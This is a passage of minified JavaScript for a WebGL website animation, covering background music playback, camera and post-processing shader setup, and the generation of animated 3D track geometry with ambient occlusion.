["audio/mpeg","/audio/this-world.mp3"]].forEach(function(c){a.canPlayType(c[0])&&(b=c[1])});b?(a.autoplay=!0,a.style.display="none",a.src=b,this.audioWaiting=!0,a.addEventListener("play",function(){this.audioWaiting=!1;a.currentTime=0;this.growlCancel.push(growl({type:"info",text:"Scroll down to stop"}));this.growlCancel.push(growl({type:"music",text:"<strong>Selah Sue</strong><br>This World",delay:1E3,link:"http://www.selahsue.com/"}))}.bind(this)),a.addEventListener("ended",function(){this.audioWaiting=
!0;this.cycleRide();this.activeRide=0;a.play()}.bind(this)),document.body.appendChild(a)):growl({type:"info",text:"Your browser does not support MP3 or OGG audio playback."})}},fadeAudio:function(){var a=this.audio;this.audio=null;var b=1,c=setInterval(function(){b*=.95;a.volume=b*Acko.globalVolume;.001>b&&(a.pause(),document.body.removeChild(a),clearInterval(c))},15)}});Acko.Effects.push(new Acko.Effect.Camera);
(function(){navigator.userAgent.match(/Android/)?Acko.Effect.Camera.camera=new THREE.PerspectiveCamera(45,1,500,1E4):Acko.Effect.Camera.camera=new THREE.PerspectiveCamera(45,1,2,17E3)})();Acko.Effect.Compose=function(){Acko.Effect.call(this);this.order=100;this.ssao=!1;this.fxaa="auto";this.eightbit=this.msaa=!1;this.white=new THREE.Color(16777215)};
Acko.Effect.Compose.prototype=_.extend(new Acko.Effect,{build:function(a){a.compose=this;var b=a.context;this.msaa=b.getParameter(b.SAMPLES);var b=a.scene,c=a.camera;a=a.renderer;var e=this.ssaoStage=new ThreeRTT.Stage(a,{history:-1,width:1,height:1,texture:{magFilter:THREE.NearestFilter,minFilter:THREE.NearestFilter}}),g=Acko.SSAOShader,g=this.ssaoMaterial=new ThreeRTT.ShaderMaterial(e,g.vertexShader,g.fragmentShader,[],g.uniforms);g.depthTest=!1;g.depthWrite=!1;e.fragment(g);a=this.composer=new THREE.EffectComposer(a);
b=this.render=new THREE.RenderPass(b,c);b.clearAlpha=0;a.addPass(b);b=this.fxaaEffect=new THREE.ShaderPass(THREE.FXAAShader);a.addPass(b);b=this.ssaoEffect=new THREE.CallbackPass(this.ssaoPass.bind(this));a.addPass(b);b=this.ssaoScaler=new THREE.ShaderPass(Acko.SSAOUpShader);a.addPass(b);b=this.eightBitEffect=new THREE.ShaderPass(Acko.EightBitShader);b.renderToScreen=!0;a.addPass(b)},ssaoPass:function(a,b){this.ssaoMaterial.uniforms.tDiffuse.value=b;this.ssaoStage.render()},depthPass:function(a,b,
c){a.render(b,c,this.depthTarget)},update:function(a){var b=a.scene,c=a.depthScene,e=a.camera,g=a.renderer,f=this.ssao&&!a.pastMasthead,h=this.eightbit,k="auto"==this.fxaa?f||h||!this.msaa:this.fxaa;this.ssaoEffect.enabled=f;var p=this.ssaoScaler;p.enabled=f;p.renderToScreen=!h;var m=this.fxaaEffect;m.enabled=k;m.renderToScreen=!f&&!h;this.eightBitEffect.enabled=h;g.setClearColor(16777215,1);f&&(this.depthPass(g,c,e),c=this.ssaoMaterial,c.uniforms.cameraNear.value=e.near,c.uniforms.cameraFar.value=
e.far,c.uniforms.seed.value=a.scroll.y,p.uniforms.cameraNear.value=e.near,p.uniforms.cameraFar.value=e.far);this.render.clearColor=this.white;f||k||h?this.composer.render():g.render(b,e);a.ambientCorrection=this.ssao?0:-.1},resize:function(a){this.depthTarget&&this.depthTarget.dispose();var b=a.renderer.devicePixelRatio,c=a.width,e=a.height;a=a.viewHeight;var g=this.eightBitEffect;g.uniforms.resolution.value.set(1/c/b,1/e/b);g.uniforms.pixelSize.value=12*e/a;a=this.depthTarget=new THREE.WebGLRenderTarget(c,
e,{minFilter:THREE.NearestFilter,magFilter:THREE.NearestFilter,format:THREE.RGBAFormat});this.fxaaEffect.uniforms.resolution.value.set(1/c/b,1/e/b);g=this.ssaoStage;g.size(c/2*b,e/2*b);var f=this.ssaoMaterial;f.uniforms.tDepth.value=a;f.uniforms.size.value.set(c/2*b,e/2*b);f.uniforms.resolution.value.set(2/c/b,2/e/b);f=this.ssaoScaler;f.uniforms.tDepth.value=a;f.uniforms.tAO.value=g.read();f.uniforms.size.value.set(c/2*b,e/2*b);f.uniforms.resolution.value.set(2/c/b,2/e/b);this.composer.setSize(c,
e)}});Acko.Effects.push(new Acko.Effect.Compose);Acko.Effect.Tracks=function(){Acko.Effect.call(this);this.order=1;this.depthGroup=this.group=null;this.nSegments=256;this.blackholeCenter=_v(285,-107.5,360);this.debugB=this.debugA=this.debug=this.blackholeB=this.blackholeA=this.blackhole=0;this.trackData=Acko.TrackData};
(function(a){function b(a){a.z+=30*Math.cos(a.x/250);return a}function c(c,e,r,z,t,B,D,w,W,u){function O(a){return D?b(a):a}for(var K=[],F=[],L=c.length,I=0;I<L;++I){var J=c[I-1],M=c[I],T=c[I+1],H=M[0],Z=M[1],Y=M[2]||0,M=M[3]||e;if(J&&T&&0<Y){var X=T[0],T=T[1];g.subVectors(J[0],H);J=g.length();f.subVectors(X,H);X=f.length();Y=Math.min(Y,Math.min(J,X)/2);g.multiplyScalar(Y/J);f.multiplyScalar(Y/X);h.addVectors(g,f);h.add(H);J=\u03c0/2/(M-1);for(H=Y=0;H<M;++H){var X=pow(Math.cos(Y),.8),V=pow(Math.sin(Y),
.8);k.copy(f).multiplyScalar(-X);p.copy(g).multiplyScalar(-V);k.add(p);k.add(h);k.add(B);K.push(O(k.clone()));z?F.push(_v()):(k.copy(Z).multiplyScalar(X),p.copy(T).multiplyScalar(V),k.add(p),F.push(k.clone()));Y+=J}}else K.push(O(H.clone().add(B))),F.push(z?_v():Z)}L=K.length;for(I=1;I<L-1;++I)1>g.subVectors(K[I],K[I-1]).length()&&(K.splice(I,1),I--,L--);if(0<r)for(I=0;I<r;++I)for(g.copy(K[0]),f.copy(K[1]),H=1;H<L-2;++H)h.copy(K[H+1]),k.subVectors(g,f),p.subVectors(h,f),J=k.length(),X=p.length(),
0<J&&0<X&&(k.add(p).multiplyScalar(w),K[H].add(k)),g.copy(f),f.copy(h);if(W&&3<L){w=9*\u03c4/360;c=1*\u03c4/360;for(Z=e=W=0;2>Z;++Z){r=[];B=[];r.push(K[0]);B.push(F[0]);g.copy(K[0]);f.copy(K[1]);for(I=1;I<L-2;++I){h.copy(K[I+1]);k.subVectors(g,f).normalize();p.subVectors(h,f).normalize();m.crossVectors(k,p);r.push(K[I]);B.push(F[I]);H=Math.asin(m.length());if(H>w)for(k.copy(K[I+2]),H=.5;1>H;H+=.5)M=H*H,T=M*H,p.x=a.interpolate(g.x,f.x,h.x,k.x,H,M,T),p.y=a.interpolate(g.y,f.y,h.y,k.y,H,M,T),p.z=a.interpolate(g.z,
f.z,h.z,k.z,H,M,T),r.push(p.clone()),B.push(_v()),W++;g.copy(f);f.copy(h)}r.push(K[I]);B.push(F[I]);r.push(K[I+1]);B.push(F[I+1]);K=r;F=B;L=K.length}if(u){r=[];B=[];r.push(K[0]);B.push(F[0]);u=0;g.copy(K[0]);f.copy(K[1]);for(I=1;I<L-2;++I)h.copy(K[I+1]),k.subVectors(g,f).normalize(),p.subVectors(h,f).normalize(),m.crossVectors(k,p),H=Math.asin(m.length())+u,H>c?(r.push(K[I]),B.push(F[I]),u=0):(e++,u=H),g.copy(f),f.copy(h);r.push(K[I]);B.push(F[I]);r.push(K[I+1]);B.push(F[I+1]);K=r;F=B;L=K.length}}if(z){F[0].copy(t).normalize();
m.copy(F[0]);g.copy(K[0]);f.copy(K[1]);for(I=1;I<L-1;++I)h.copy(K[I+1]),k.subVectors(f,g).normalize(),p.subVectors(h,f).normalize(),k.cross(p),Y=Math.asin(k.length()),z=Math.cos(Y),t=Math.sin(Y),k.normalize(),z=new THREE.Matrix3(z+k.x*k.x*(1-z),k.x*k.y*(1-z)-k.z*t,k.x*k.z*(1-z)+k.y*t,k.x*k.y*(1-z)+k.z*t,z+k.y*k.y*(1-z),k.y*k.z*(1-z)-k.x*t,k.x*k.z*(1-z)-k.y*t,k.y*k.z*(1-z)+k.x*t,z+k.z*k.z*(1-z)),m.applyMatrix3(z).normalize(),F[I].copy(m),g.copy(f),f.copy(h);F[I].copy(m);for(I=0;2>I;++I)for(g.copy(F[0]),
f.copy(F[1]),H=1;H<L-1;++H)h.copy(F[H+1]),k.subVectors(g,f),p.subVectors(h,f),J=k.length(),X=p.length(),0<J&&0<X&&(k.add(p).multiplyScalar(.3),F[H].add(k).normalize()),g.copy(f),f.copy(h)}navigator.userAgent.match(/Android/)&&(K=K.filter(function(a,b){return!(b%2)}),F=L=F.filter(function(a,b){return!(b%2)}));return{vertices:K,normals:F}}function e(a,b,c){var e=[],C=null,B;for(B in a)C!=a[B].AODiscs&&a[B].AODiscs&&(e=e.concat(a[B].AODiscs)),C=a[B].AODiscs;var w=e.length;a=new THREE.Object3D;a.add(function(){for(var a=
new THREE.Geometry,c=a.vertices=[],q=\u03c4/12,r=0;r<w;++r){var B=e[r],C=B.radius;g.copy(B.normal);f.copy(B.position);h.copy(B.normal);h.x+=2*h.y;h.z+=.1-h.y;h.cross(g).normalize();k.crossVectors(h,g);t.copy(f);B=Math.max(0,1-B.front);if(!(0>=B)){c.push(g.clone().multiplyScalar(.5).add(f));c.push(g.clone().multiplyScalar(B*C).add(f));c.push(h.clone().multiplyScalar(.5*C).add(f));c.push(h.clone().multiplyScalar(C).add(f));c.push(h.clone().multiplyScalar(.5*-C).add(f));c.push(h.clone().multiplyScalar(-C).add(f));
c.push(k.clone().multiplyScalar(.5*C).add(f));c.push(k.clone().multiplyScalar(C).add(f));c.push(k.clone().multiplyScalar(.5*-C).add(f));c.push(k.clone().multiplyScalar(-C).add(f));for(var L=0,I=0;12>=I;++I)p.copy(h).multiplyScalar(Math.cos(L)*C*B),m.copy(k).multiplyScalar(Math.sin(L)*C*B),m.add(p).add(f),0<I&&(c.push(m.clone()),c.push(t.clone())),t.copy(m),L+=q}}a.computeBoundingSphere();a=new THREE.Line(a,new THREE.LineBasicMaterial({color:b}));a.type=THREE.LinePieces;a.renderDepth=3;return a}());
c=c.clone();c.r*=.5;c.g*=.5;c.b*=.5;a.add(function(){for(var a=new THREE.Geometry,b=a.vertices=[],q=\u03c4/12,y=0;y<w;++y){var B=e[y],C=B.radius;g.copy(B.normal);f.copy(B.position);h.copy(B.normal);h.x+=2*h.y;h.z+=.1-h.y;h.cross(g).normalize();k.crossVectors(h,g);t.copy(f);B=Math.max(0,1-B.back);if(!(0>=B)){b.push(g.clone().multiplyScalar(-.5).add(f));b.push(g.clone().multiplyScalar(-B*C).add(f));for(var L=0,I=0;12>=I;++I)p.copy(h).multiplyScalar(Math.cos(L)*C*B),m.copy(k).multiplyScalar(Math.sin(L)*
C*B),m.add(p).add(f),0<I&&(b.push(m.clone()),b.push(t.clone())),t.copy(m),L+=q}}a.computeBoundingSphere();a=new THREE.Line(a,new THREE.LineBasicMaterial({color:c}));a.type=THREE.LinePieces;a.renderDepth=10;return a}());return a}var g=_v(),f=_v(),h=_v(),k=_v(),p=_v(),m=_v(),t=_v();_v();_v();_v();_v();var w=new THREE.Matrix4;a.prototype=_.extend(new Acko.Effect,{build:function(a){a.tracks=this;var b=a.scene,c=a.depthScene,e=a.context,g=this.visibleGroup=new THREE.Object3D;b.add(g);b=this.depthGroup=
new THREE.Object3D;c.add(b);c=this.visibleHolder=new THREE.Object3D;c.position.x=0;c.position.y=-10;c.position.z=200;g.add(c);g=this.depthHolder=new THREE.Object3D;g.position.x=0;g.position.y=-10;g.position.z=200;b.add(g);this.prepareTracks();this.prepareAO();this.prepareTexture(e);this.prepareGeometry();this.prepareMesh();this.prepareWriter(e);window.addEventListener("message",function(b){(d=b.data)&&(d=d.mathBoxDirector)&&"go"==d.method&&(this.debug=v=Math.max(0,Math.min(1,d.args[0]-1)),a.masthead.showTitle=
1-v,a.masthead.showArrow=1-v)}.bind(this))},prepareTracks:function(){var b=this.nSegments;this.trackPages=[];this.tracks=[];this.width=0;this.height=b;this.trackData.forEach(function(c){c=new a.Track(c,b);this.tracks.push(c);this.trackPages.push(this.width/2);c.dead||(this.width+=2*c.getN())}.bind(this));this.nTris=this.width*this.height;this.nVerts=this.width*this.height/2},prepareAO:function(){if(this.tracks.length)if(Acko.AOData)this.importAO(Acko.AOData);else{this.AO=new a.AmbientOcclusion;this.AO.build(this.tracks);
this.AO.compute();var b;b=this.tracks[13].AODiscs;b[88].front+=.12;b[90].front+=.3;b[92].front+=.36;b[94].front+=.3;b[96].front+=.18;b[89].front+=.12;b[91].front+=.18;b[93].front+=.18;b[95].front+=.12;b=this.tracks[12].AODiscs;b[54].back-=.06*1.15;b[54].back-=.06*1.15;b[55].back-=.12*1.15;b[55].back-=.12*1.15;b[56].back-=.207;b[57].back-=.207;b[58].back-=.24*1.15;b[59].back-=.2875;b[60].back-=.1955;b[61].back-=.207;b[62].back-=.12*1.15;b[63].back-=.161;b[64].back-=.05*1.15;b[65].back-=.06*1.15;b[67].back-=
.03*1.15;b=this.tracks[2].AODiscs;b[61].front+=.3;b[63].front+=.25;b[65].front+=.15;b[62].front+=.25;b[64].front+=.2;b[66].front+=.1}},prepareTexture:function(a){var b=this.texture=a.createTexture();a.bindTexture(a.TEXTURE_2D,b);a.pixelStorei(a.UNPACK_ALIGNMENT,1);a.texParameteri(a.TEXTURE_2D,a.TEXTURE_WRAP_S,a.CLAMP_TO_EDGE);a.texParameteri(a.TEXTURE_2D,a.TEXTURE_WRAP_T,a.CLAMP_TO_EDGE);a.texParameteri(a.TEXTURE_2D,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(a.TEXTURE_2D,a.TEXTURE_MAG_FILTER,
a.NEAREST);var b=this.width,c=this.height,e=new Float32Array(b*c*4);a.texImage2D(a.TEXTURE_2D,0,a.RGBA,b,c,0,a.RGBA,a.FLOAT,e);a=this.textureObject=new THREE.Texture(new Image,new THREE.UVMapping,THREE.ClampToEdgeWrapping,THREE.ClampToEdgeWrapping,THREE.NearestFilter,THREE.NearestFilter);a.__webglInit=!0;a.__webglTexture=this.texture},prepareGeometry:function(a){this.geometry=this.makeGeometry(a);this.depthGeometry=this.makeGeometry(a)},makeGeometry:function(a){a=new THREE.BufferGeometry;a.attributes=
{index:{itemSize:1,array:new Uint16Array(3*this.nTris)},position:{itemSize:3,array:new Float32Array(3*this.nVerts)},color:{itemSize:3,array:new Float32Array(3*this.nVerts)}};var b=1/this.width,c=1/this.height,e=this.nSegments,g=a.attributes.position.array,f=a.attributes.index.array,h=a.attributes.color.array,k=b/2,m=0,p=0,t=0;_.each(this.tracks,function(a){for(var q=a.getN(),w=a.getColor().clone().convertGammaToLinear(),I=0,J=c/2;I<e;++I,J+=c)for(var M=0,T=k;M<q;++M,m+=3,T+=2*b)g[m]=T,g[m+1]=J,g[m+
2]=0,h[m]=w.r,h[m+1]=w.g,h[m+2]=w.b;k+=2*a.getN()*b;a=q;w=!0;for(I=0;I<e;++I)for(I==e-1&&(a=q*(1-e)),J=1,M=0;M<q;++M,p+=6,++t)M==q-1&&(J=1-q),w?(f[p]=t,f[p+1]=t+J+a,f[p+2]=t+a,f[p+3]=t,f[p+4]=t+J,f[p+5]=t+J+a):(f[p]=t,f[p+1]=t+J,f[p+2]=t+a,f[p+3]=t+J,f[p+4]=t+J+a,f[p+5]=t+a),0==(M+1)%2&&(w=!w)});return a},prepareMesh:function(){var a=this.material=new THREE.ShaderMaterial(Acko.TrackShader);a.uniforms.tGeometry.value=this.textureObject;a.uniforms.sampleStep.value.set(1/this.width,1/this.height);var b=
this.mesh=new THREE.Mesh(this.geometry,this.material);b.frustumCulled=!1;b.renderDepth=-2E4;this.visibleHolder.add(b);b=a.clone();b.fragmentShader=THREE.ShaderLib.depthRGBA.fragmentShader;b.vertexShader=Acko.TrackShader.depthVertexShader;b.blending=THREE.NoBlending;b.transparent=!0;b.uniforms=a.uniforms;this.depthMaterial=b;a=this.depthMesh=new THREE.Mesh(this.depthGeometry,this.depthMaterial);a.frustumCulled=!1;a.renderDepth=-2E4;this.depthHolder.add(a)},prepareWriter:function(a){var b=0;this.setPage=
function(a){a=this.trackPages[a];b=2*a;return a};var c=!0,e=this.texture;this.bindTexture=function(){c=!0};this.writeCallback=function(g,f,h,k,m){c&&(a.bindTexture(a.TEXTURE_2D,e),a.pixelStorei(a.UNPACK_ALIGNMENT,1),c=!1);f+=b;h+m>this.height&&console.assert(!1);a.texSubImage2D(a.TEXTURE_2D,0,f,h,k,m,a.RGBA,a.FLOAT,g)}.bind(this);this.prioritySort=function(a,b){return b.priority-a.priority}},updateTrackTexture:function(a,b){var c=this.nSegments;this.bindTexture();for(var e=[],g=this.tracks.length,
f=0;f<g;++f){var h=this.tracks[f];if(!h.dead){var k=this.setPage(f);h.update(a,b,this.writeCallback);e=e.concat(h.getGeometryOffsets(k*c))}}e.sort(this.prioritySort);this.geometry.offsets=e;this.depthGeometry.offsets=e},update:function(a){if(this.tracks.length){this.mesh.visible=!a.pastMasthead||a.visualizer.playing&&.9>a.visualizer.slerpB;this.updateTrackTexture(a.time,a.delta);var b=this.material.uniforms,c=this.depthMaterial.uniforms,e=a.heroAbsScale||1;b.ambientCorrection.value=a.ambientCorrection||
0;b.opacity.value=a.ride?a.backgroundOpacity:1;var f=this.tracks[0];b.ambientOcclusion.value=.5*Math.min(1,Math.max(0,1-(Math.abs(f.initial-f.travel)-1500)/3300))+.5;f=Math.pow(.12,3/(1+2*Time.getSpeed()));this.blackholeA+=((a.ride?0:2.85*this.blackhole)-this.blackholeA)*f;var h=this.blackholeB+=(this.blackholeA-this.blackholeB)*f,h=.7+(.5>h?h*h:h-.25);b.blackhole.value=h;c.blackhole.value=h;b.fogBegin.value=2200*(1+a.overlayScale)/2;w.getInverse(this.mesh.matrixWorld);g.copy(this.blackholeCenter).multiplyScalar(e).applyMatrix4(w);
b.center.value.copy(g);this.visibleHolder.scale.set(e,e,e);this.depthHolder.scale.set(e,e,e);f/=2;this.debugA+=(this.debug-this.debugA)*f;this.debugB+=(this.debugA-this.debugB)*f;b.displacement.value=this.debugB}},override:function(a){if(this.tracks.length){if(void 0!==a)for(var b=0;b<this.tracks.length;++b)this.tracks[b].override=a;return this.tracks[0].override}},exportTexture:function(){var a=new THREE.MeshBasicMaterial({color:16777215,map:this.textureObject,fog:!1});a.side=THREE.DoubleSide;var b=
new THREE.RoundRectGeometry(this.width,this.height,7,6,!0);return{object:new THREE.Mesh(b,a),width:this.width,height:this.height}},exportTracks:function(){var a=new THREE.Object3D,c=new THREE.Geometry,e=new THREE.Geometry,f=new THREE.Geometry,h=c.vertices,k=f.vertices,m=e.vertices;this.tracks.slice(0,-6).forEach(function(a,c){var e=a.relative;if(1!=c&&3!=c&&5!=c){var f=a.points.map(function(a){return b(a[0].clone().add(e))}).slice(1,-1),q=a.path.vertices.slice(1,-1),r=a.path.normals.slice(1,-1);4==
c&&(f=f.slice(2),q=q.slice(5),r=r.slice(5));8==c&&(q=q.slice(0,-20),r=r.slice(0,-20));_v(.3,.5,0);for(c in f)0<c&&(h.push(f[c-1]),h.push(f[c]));for(c in q)f=q[c],0<c&&(m.push(q[c-1]),m.push(f)),g.copy(r[c]).multiplyScalar(25),k.push(f.clone()),k.push(f.clone().add(g))}}.bind(this));c.computeBoundingSphere();f.computeBoundingSphere();e.computeBoundingSphere();c=new THREE.Line(c,new THREE.LineBasicMaterial({color:Acko.Palette.blue[1],linewidth:2}));c.renderDepth=1;c.type=THREE.LinePieces;e=new THREE.Line(e,
new THREE.LineBasicMaterial({color:Acko.Palette.blue[0],linewidth:2}));e.renderDepth=3;e.type=THREE.LinePieces;f=new THREE.Line(f,new THREE.LineBasicMaterial({color:Acko.Palette.platinum[0],linewidth:1}));f.renderDepth=4;f.type=THREE.LinePieces;a.add(c);a.add(e);a.add(f);return{object:a,width:960,height:500}},exportDiscs:function(){return{object:e(this.tracks,Acko.Palette.blue[1],Acko.Palette.blue[0]),width:960,height:500}},importAO:function(b){try{b=JSON.parse(b)}catch(c){return}var e=null,g,f,h,
k;for(f in b){g=b[f];var m=this.tracks[f];if(g){e=[];m.AOStart=g[0];m.AOEnd=g[1];m.AOStep=g[2];var p=g[3],t=g[4];for(h in t)k=t[h],g=new a.Disc(_v(k[0],k[1],k[2]),_v(k[3],k[4],k[5]),p,1),g.front=k[6],g.back=k[7],e.push(g);m.AODiscs=e;e=m}else m.AOStart=e.AOStart,m.AOEnd=e.AOEnd,m.AOStep=e.AOStep,m.AODiscs=e.AODiscs}},exportAO:function(){var a=null,b=this.tracks.map(function(b,c){if(a&&a==b.AODiscs||!b.AODiscs)return a=null;a=b.AODiscs;var e=[],g;for(i in b.AODiscs)g=b.AODiscs[i],e.push([g.position.x,
g.position.y,g.position.z,g.normal.x,g.normal.y,g.normal.z,g.front,g.back]);return[b.AOStart,b.AOEnd,b.AOStep,g.radius,e]});return JSON.stringify(b).replace(/([1-9][0-9]{2,})\.([0-9]+)/g,"$1").replace(/([1-9][0-9])\.([0-9])([0-9]*)/g,"$1.$2").replace(/([1-9])\.([0-9]{2})([0-9]*)/g,"$1.$2").replace(/(0\.[0-9]{3})([0-9]+)/g,"$1").replace(/0\.0+([,}])/g,"0$1").replace(/[0-9]+\.[0-9]+e-[0-9]+/g,0)}});a.Track=function(b,e){this.nSegments=e;var f=b||{};this.nProfile=f.n||8;this.width=f.width||100;this.height=
f.height||50;this.power=f.power||.25;this.points=f.points||[];this.arrow=f.arrow||0;this.shift=f.shift||0;this.truncate=f.truncate||0;this.aspect=f.aspect||1;this.smooth=f.smooth||0;this.spring=f.spring||.3;this.up=f.up||_v(0,1,0);this.detail=f.detail||5;this.relative=f.relative||_v(0,0,0);this.color=f.color||new THREE.Color(16777215);this.bend=f.bend||3;this.edge=f.edge||2;this.dead=f.dead||!1;this.AOStep=f.AOStep||null;this.castAO=void 0===f.castAO?1:f.castAO;this.receiveAO=void 0===f.receiveAO?
1:f.receiveAO;this.lengthAO=f.lengthAO;this.travelAO=f.travelAO;this.bank=void 0===f.bank?!0:f.bank;this.warp=void 0===f.warp?!0:f.warp;this.refine=void 0===f.refine?!0:f.refine;this.simplify=void 0===f.simplify?!0:f.simplify;this.detail=1.1*Math.max(this.detail,10);this.smooth*=1.1;this.travel=f.travel||0;this.length=f.length||50;this.travelOverride=f.travelOverride||this.travel;this.lengthOverride=f.lengthOverride||this.length;this.override=!1;this.speed=f.speed||600;this.distance=1.09*(f.distance||
3E3);this.speed*=1.15;this.duration=this.distance/Math.max(1,this.speed)+this.bend;this.initial=this.travel;var f=this.width,h=this.height,k=this.power,m=this.nProfile,p=[],t=[],w=\u03c4/m,u=w/2;g.set(0,0,1);for(var O=0;O<m;++O)p.push(_v(pow(Math.cos(u),k)*f,pow(Math.sin(u),k)*h,0)),u+=w;for(O=0;O<m;++O)t.push(p[(O+1)%m].clone().sub(p[(O+m-1)%m]).cross(g).normalize());this.profile={vertices:p,normals:t};this.path=c(this.points,this.detail,this.smooth,this.bank,this.up,this.relative,this.warp,this.spring,
this.refine,this.simplify);this.lengthMap=new a.LengthMap(this.path.vertices);this.bufferSize=e;this.buffer=new Float32Array(8*this.nProfile*this.bufferSize);this.lastLength=this.lastTravel=0;this.priority=a.Track.index--;this.range=this.endSlot=this.startSlot=this.lastEndSlot=this.lastStartSlot=0;this.slots=[];for(f=0;f<this.nSegments;++f)this.slots.push(new a.Slot);this.baseIndex=-1;this.geometryOffsets=[{start:0,index:0,count:0},{start:0,index:0,count:0}];this.mat4=new THREE.Matrix4;this.mat3=
new THREE.Matrix3;this.prepareGenerator()};a.Track.prototype={prepareGenerator:function(){function a(c){0<F&&t(f,0,c,2*b,F);F=w=0}var b=this.nProfile,c=this.nSegments,e=this.bufferSize,f=this.buffer,g=this.arrow,h=this.lengthMap,k=this.width,m=this.shift,p=this.slots,t=null,w=0,F=0,L=0,I=!1;this.beginPass=function(a,b){L=a;t=b;I=!1};this.endPass=function(){a(L-F)};this.clear=function(e,f){var g=(e%c+c)%c;e=g;for(var h=0;h<f;){p[e].type=-1;this.getBlank(w);w+=b;++F;++h;var k=(g+h)%c;0==k&&(a(g),g=
0);e=k}a(g)};this.nextSlot=function(f,g,h){var k=p[L];k&&(k.offset!==f||k.type!==g||k.key!==h?(g(f),w+=b,++F,k.offset=f,k.type=g,k.key=h,I=!0):(I&&a(L-F),I=!1),F!=e&&L!=c-1||a(L-F+1),L=(L+1)%c)};this.generators={begin:function(a){this.getEnd(a,-1,w)}.bind(this),beginCap:function(a){this.getOutline(a,0,a,-1,.8,.8,w)}.bind(this),outline:function(a){this.getOutline(a,0,a,0,1,1,w)}.bind(this),beginArrow:function(a){this.getOutline(h.map(h.unmap(a)+m),-m,a,0,g/k,1,w)}.bind(this),midArrow:function(a){var b=
this.arrow/this.aspect,c=(b-this.truncate)/2;this.getOutline(h.map(h.unmap(a)+m),c-m,h.map(h.unmap(a)+c),0,g/k*(1-c/b),1,w)}.bind(this),endArrow:function(a){var b=this.arrow/this.aspect,c=b-this.truncate;this.getOutline(h.map(h.unmap(a)+m),c-m,h.map(h.unmap(a)+c),0,g/k*(1-c/b),1,w)}.bind(this),endCap:function(a){this.getOutline(a,0,a,1,.8,.8,w)}.bind(this),end:function(a){this.getEnd(a,1,w)}.bind(this)}},update:function(a,b,c){var e=this.nSegments;b=this.lengthMap;var f=Acko.ReverseTracks?-1:1;this.distance&&
(a=Math.max(0,(this.duration-a)/this.bend),a=(.5>a?a*a:a-.25)*this.bend,this.travel=this.initial-a*this.speed*f,0==a&&(this.speed=this.distance=0));var g=this.override?this.travelOverride:this.travel,h=Math.max(0,this.override?this.lengthOverride:this.length),h=h-this.arrow/this.aspect;if(g!=this.lastTravel||h!=this.lastLength){this.lastTravel=g;this.lastLength=h;var k=b.map(g),m=Math.max(0,this.truncate-this.arrow/this.aspect);a=b.map(g+h-m);var p=this.getPathCount(),f=Math.min(p,Math.max(0,Math.floor(k))),
t=Math.min(p,Math.max(0,Math.ceil(a)));-1==this.baseIndex&&(this.baseIndex=f);var p=f-this.baseIndex,t=t-this.baseIndex,w=t-p,t=p+w+(this.arrow?5:4);this.range=t-p;this.range>=e?console.warn("Track: Segment limit exceeded"):(this.lastStartSlot<p&&this.clear(this.lastStartSlot,p-this.lastStartSlot),this.lastEndSlot>t&&this.clear(t+1,this.lastEndSlot-t));this.startSlot=(p%e+e)%e;this.endSlot=(t%e+e)%e;this.beginPass(this.startSlot,c);c=b.map(g-this.edge);b=b.map(g+h-m+this.edge);e=this.generators;this.nextSlot(c,
e.begin);this.nextSlot(c,e.beginCap);this.nextSlot(k,e.outline);for(c=1;c<w;++c)this.nextSlot(f+c,e.outline);this.arrow?(this.nextSlot(a,e.outline,b),this.nextSlot(a,e.beginArrow,b),this.nextSlot(a,e.midArrow,b),this.nextSlot(a,e.endArrow,b)):(this.nextSlot(a,e.outline),this.nextSlot(b,e.endCap),this.nextSlot(b,e.end));this.endPass();this.lastStartSlot=p;this.lastEndSlot=t}},getGeometryOffsets:function(a){var b=this.geometryOffsets,c=this.nSegments*this.nProfile,e=this.startSlot*this.nProfile,f=e+
this.range*this.nProfile,g=this.range*this.nProfile;if(e==f)return[];b[0].priority=this.priority;b[1].priority=this.priority;if(f>c)return b[0].start=6*(a+e),b[0].index=0,b[0].count=6*(c-e),b[1].start=6*a,b[1].index=0,b[1].count=6*(g-(c-e)),b;b[0].start=6*(a+e);b[0].index=0;b[0].count=6*g;return[b[0]]},getPathCount:function(){return this.path.vertices.length},getMatrices:function(a){var b=this.path.vertices,c=this.path.normals,e=Math.floor(Math.max(0,Math.min(b.length-1.0001,a)));a-=e;var m=b[e-1],
t=b[e],w=b[e+1],G=b[e+2],W=c[e],c=c[e+1];0==e&&.5>=a||e==b.length-2&&.5<a?h.subVectors(w,t):(.5<a?(g.subVectors(w,t),f.subVectors(G,w)):(g.subVectors(t,m),f.subVectors(w,t)),h.copy(g).lerp(f,(a+.5)%1));k.copy(W).lerp(c,a);g.copy(t).lerp(w,a);b=h.normalize();e=k.normalize();c=p.crossVectors(b,e);e.crossVectors(b,c);this.mat4.set(c.x,e.x,b.x,g.x,c.y,e.y,b.y,g.y,c.z,e.z,b.z,g.z,0,0,0,1);this.mat3.set(c.x,e.x,b.x,c.y,e.y,b.y,c.z,e.z,b.z);return{mat4:this.mat4,mat3:this.mat3}},getBlank:function(a){var b=
this.nProfile,c=0;for(a*=8;c<b;++c,a+=8)this.buffer[a]=0,this.buffer[a+1]=0,this.buffer[a+2]=0,this.buffer[a+3]=1,this.buffer[a+4]=0,this.buffer[a+5]=0,this.buffer[a+6]=1,this.buffer[a+7]=1},getEnd:function(a,b,c){var e=this.getMatrices(a);g.set(0,0,0);g.applyMatrix4(e.mat4);e=e.mat3.elements;f.set(b*e[6],b*e[7],b*e[8]);this.receiveAO&&this.getAO(a);a=1;this.receiveAO&&(a=(m.y+m.x+t.y+t.x)/4);b=this.nProfile;e=0;for(c*=8;e<b;++e,c+=8)this.buffer[c]=g.x,this.buffer[c+1]=g.y,this.buffer[c+2]=g.z,this.buffer[c+
3]=a,this.buffer[c+4]=f.x,this.buffer[c+5]=f.y,this.buffer[c+6]=f.z,this.buffer[c+7]=1;return this.buffer},getOutline:function(a,b,c,e,p,w,D){a=this.getMatrices(a);var G=this.profile.vertices,W=this.profile.normals,u=this.nProfile,O=a.mat3.elements;k.set(e*O[6],e*O[7],e*O[8]);h.set(p,w,1);this.receiveAO&&this.getAO(c);c=0;for(D*=8;c<u;++c,D+=8){g.copy(G[c]);g.z+=b;g.multiply(h).applyMatrix4(a.mat4);this.buffer[D]=g.x;this.buffer[D+1]=g.y;this.buffer[D+2]=g.z;O=1;if(this.receiveAO)var O=.5*W[c].x+
